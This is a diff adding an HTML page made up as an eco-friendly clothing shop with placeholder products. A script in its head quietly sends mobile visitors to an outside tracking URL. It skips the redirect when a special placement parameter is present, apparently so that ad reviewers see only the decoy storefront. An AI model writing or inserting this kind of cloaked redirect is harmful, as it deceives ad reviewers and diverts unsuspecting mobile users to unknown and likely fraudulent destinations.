@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Eco-Friendly Fashion Emporium</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #e0f2e9;
+            color: #2c3e50;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #27ae60;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            color: #ecf0f1;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            padding: 20px;
+        }
+        .product {
+            background-color: #ffffff;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+        .product:hover {
+            transform: scale(1.05);
+        }
+        .product img {
+            max-width: 100%;
+            border-radius: 5px;
+        }
+        footer {
+            background-color: #27ae60;
+            color: #ecf0f1;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        a {
+            color: #ecf0f1;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Eco-Friendly Fashion Emporium</h1>
+    </header>
+    <main>
+        <div class="product">
+            <img src="https://placehold.co/200x200?text=Bamboo+Tee" alt="Bamboo T-shirt">
+            <h2>Bamboo T-shirt</h2>
+            <p>$29.99</p>
+        </div>
+        <div class="product">
+            <img src="https://placehold.co/200x200?text=Hemp+Jeans" alt="Hemp Jeans">
+            <h2>Hemp Jeans</h2>
+            <p>$59.99</p>
+        </div>
+        <div class="product">
+            <img src="https://placehold.co/200x200?text=Organic+Cotton+Dress" alt="Organic Cotton Dress">
+            <h2>Organic Cotton Dress</h2>
+            <p>$79.99</p>
+        </div>
+        <div class="product">
+            <img src="https://placehold.co/200x200?text=Recycled+Polyester+Jacket" alt="Recycled Polyester Jacket">
+            <h2>Recycled Polyester Jacket</h2>
+            <p>$89.99</p>
+        </div>
+    </main>
+    <footer>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
